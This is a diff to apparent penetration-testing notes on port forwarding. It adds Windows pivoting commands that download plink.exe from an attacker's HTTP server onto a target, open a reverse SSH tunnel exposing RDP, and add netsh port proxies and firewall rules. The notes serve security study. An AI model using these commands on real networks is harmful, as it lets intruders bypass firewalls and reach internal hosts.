@@ -1,14 +1,13 @@
 # Port Forwarding
 
-## Socat Port Forwarding
+## Linux
+
+### Socat Port Forwarding
 Via `socat`:
 ```bash
 socat -ddd TCP-LISTEN:<port to listen on>,fork TCP:<IP to forward to>:<port to forward to>
 ```
 Remember it is useful to select a high port to listen on (>1000), since our choice of port there is arbitrary, but we cannot have ports below 1000, as we require admin privileges to bind to those!
-
-## SSH Tunneling
-Principle here is to establish a tunnel from machine 1 to machine 2, that subsequently forwards traffic onto machine 3
 
 ### SSH Local Port Forwarding
 Execute this command on machine 1:
@@ -65,4 +64,45 @@ proxychains nmap -sV -sT -A <machine2 IP>
 This tool seems to do some of the heavy lifting from the commands above, assuming we already have port 2222 forwarding traffic to the `machine2` SSH server:
 ```bash
 sshuttle -r user@<machine1 IP>:2222 <CIDR range 1> <CIDR range 2> ...
+```
+
+## Windows
+
+### SSH
+`ssh.exe` is a thing and work in precisely the same manner with the same flags. No need to repeat ourselves.
+
+### Plink
+Begin in the usual fashion:
+```bash
+sudo cp /usr/share/windows-resources/binaries/plink.exe .
+python3 -m http.server 80
+```
+```powershell
+wget -Uri http://<our IP>/plink.exe -OutFile C:\Windows\Temp\plink.exe
+```
+Principles are much the same, however `plink.exe` cannot do Dynamic Remote Port Forwarding \*cries in Windows\*. For a standard remote port forward:
+```powershell
+cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:2345:127.0.0.1:3389 <our IP>
+```
+The significance of port `3389` is that this is the RDP port, and therefore our choice of port for the traffic to loopback to once it's gone though port 22. On our Kali host `2345` will be the port serving our loopback. We can now use this to upgrade a shell to a previously firewalled off RDP session:
+```bash
+xfreerdp /v:127.0.0.1:2345 /u:username /p:password
+```
+
+### netsh
+If we have admin on a Windows machine then we will be able to run the Windows native port forwarding tool `netsh`. For a simple port forward on a Windows `machine1`:
+```powershell
+netsh interface portproxy add v4tov4 listenport=<machine1 port> listenaddress=<machine1 IP> connectport=<machine2 port> connectaddress=<machine2 IP>
+```
+To remove when we're done:
+```powershell
+netsh interface portproxy del v4tov4 listenport=<machine1 port> listenaddress=<machine1 IP>
+```
+If there happens to be a firewall preventing us from directly connecting to the `machine1` port then `netsh` is also our friend:
+```powershell
+netsh advfirewall firewall add rule name="our_firewall_rule_name" protocol=TCP dir=in localip=<machine1 IP> localport=<machine1 port> action=allow
+```
+To remove when we're done:
+```powershell
+netsh advfirewall firewall delete rule name="our_firewall_rule_name"
 ```
